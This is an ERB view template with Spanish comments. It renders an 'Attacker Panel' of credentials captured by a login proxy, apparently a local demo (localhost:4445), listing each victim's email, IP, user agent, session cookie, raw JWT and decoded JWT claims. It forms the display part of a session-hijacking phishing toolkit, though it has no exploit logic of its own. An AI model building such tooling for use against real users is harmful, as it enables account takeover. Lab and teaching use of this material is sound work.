<%# Título de la página utilizado por el layout %>
<% @title = "Attacker Panel — Captured Tokens" %>

<div class="attacker-dashboard">

  <%# Encabezado con resumen del número de credenciales capturadas %>
  <div class="attacker-header-info">
    <h1> Captured Credentials</h1>
    <p class="subtitle">
      Total captured: <strong><%= @decoded.length %></strong>
    </p>
  </div>

  <%# Si no hay resultados, mostramos un estado vacío con instrucciones %>
  <% if @decoded.empty? %>
    <div class="empty-state">
      <p> No credentials captured yet.</p>
      <p>Wait for a victim to log in through the proxy at
        <strong>localhost:4445</strong>
      </p>
    </div>
  <% else %>

    <%# Itera sobre cada credencial decodificada y muestra una tarjeta con datos %>
    <% @decoded.each do |entry| %>
      <div class="credential-card">

        <div class="credential-header">
          <%# Email de la víctima y fecha de captura %>
          <span class="victim-email">👤 <%= entry[:cred][:email] %></span>
          <span class="captured-time">
            🕐 <%= entry[:cred][:captured_at] %>
          </span>
        </div>

        <div class="credential-body">

          <%# IP y user-agent capturados al momento del login %>
          <div class="credential-row">
            <span class="label">IP</span>
            <span class="value"><%= entry[:cred][:ip] %></span>
          </div>

          <div class="credential-row">
            <span class="label">User Agent</span>
            <span class="value"><%= entry[:cred][:user_agent] %></span>
          </div>

          <%# Cookie de sesión capturada por el proxy %>
          <div class="credential-row">
            <span class="label">Session Cookie</span>
            <span class="value cookie"><%= entry[:cred][:session_cookie] %></span>
          </div>

          <%# JWT en bruto tal como fue capturado %>
          <div class="credential-row">
            <span class="label">JWT Token</span>
            <span class="value token"><%= entry[:cred][:token] %></span>
          </div>

          <%# Si el token pudo decodificarse, mostramos su payload legible %>
          <% if entry[:valid] %>
            <div class="jwt-payload">
              <h4> Decoded JWT Payload</h4>
              <div class="payload-row">
                <span class="label">Subject (user)</span>
                <span class="value"><%= entry[:payload]['sub'] %></span>
              </div>
              <div class="payload-row">
                <span class="label">Issuer</span>
                <span class="value"><%= entry[:payload]['iss'] %></span>
              </div>
              <div class="payload-row">
                <span class="label">Issued at</span>
                <span class="value">
                  <%# Convierte el timestamp `iat` a formato legible %>
                  <%= Time.at(entry[:payload]['iat']).strftime("%Y-%m-%d %H:%M:%S") %>
                </span>
              </div>
              <div class="payload-row">
                <span class="label">Expires at</span>
                <span class="value">
                  <%# Convierte el timestamp `exp` a formato legible %>
                  <%= Time.at(entry[:payload]['exp']).strftime("%Y-%m-%d %H:%M:%S") %>
                </span>
              </div>
            </div>
          <% end %>

        </div>
      </div>
    <% end %>

  <% end %>
</div>